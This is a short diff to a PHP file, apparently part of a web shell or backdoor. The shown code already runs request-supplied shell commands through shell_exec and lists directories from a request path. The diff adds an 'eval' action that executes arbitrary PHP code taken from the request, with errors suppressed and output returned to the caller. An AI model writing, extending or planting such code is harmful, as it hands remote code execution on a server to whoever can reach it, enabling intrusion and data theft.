@@ -1449,6 +1449,23 @@ function run($p) {
         $c = isset($req['c']) ? (string)$req['c'] : '';
         $o = @shell_exec($c . ' 2>&1');
         $r['data'] = array('stdout' => base64_encode((string)$o), 'cwd' => getcwd());
+    } elseif ($a === 'eval') {
+        $c = isset($req['c']) ? (string)$req['c'] : '';
+        if ($c !== '') {
+            ob_start();
+            try {
+                @eval($c);
+                $r['data'] = (string)ob_get_clean();
+            } catch (Exception $e) {
+                $r['data'] = (string)ob_get_clean();
+                $r['ok'] = false;
+                $r['error'] = $e->getMessage();
+            } catch (Throwable $t) {
+                $r['data'] = (string)ob_get_clean();
+                $r['ok'] = false;
+                $r['error'] = $t->getMessage();
+            }
+        }
     } elseif ($a === 'list') {
         $d = isset($req['p']) ? (string)$req['p'] : '.';
         $items = @scandir($d);
